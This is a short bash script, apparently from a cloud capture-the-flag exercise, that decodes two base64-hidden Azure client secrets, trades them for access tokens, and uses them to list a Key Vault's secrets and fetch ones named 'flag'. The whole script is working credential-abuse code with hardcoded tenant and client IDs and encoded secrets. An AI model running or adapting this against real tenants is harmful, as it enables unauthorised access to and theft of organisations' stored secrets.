#!/usr/bin/env bash
set -uo pipefail
TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SS_SECRET=$(echo 'fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==' | base64 -d)
RV_SECRET=$(echo 'LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg==' | base64 -d)
get() { curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "scope=https://vault.azure.net/.default" --data-urlencode "grant_type=client_credentials" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
SS=$(get 58108da8-044e-4d7e-9a46-92e6179b30be "$SS_SECRET")
echo "SS_LEN=${#SS}"
echo "== SEC VAULT LIST (secrets-sync) =="
curl -sS -H "Authorization: Bearer $SS" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25"; echo
for s in flag FLAG flag-tbl; do echo "== sec/$s =="; curl -sS -H "Authorization: Bearer $SS" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$s?api-version=7.4"; echo; done
RV=$(get 881fddce-6208-4af5-a297-7e79c912f83c "$RV_SECRET")
echo "RV_LEN=${#RV}"
echo "== SEC VAULT LIST (reporting-viewer) =="
curl -sS -H "Authorization: Bearer $RV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25"; echo
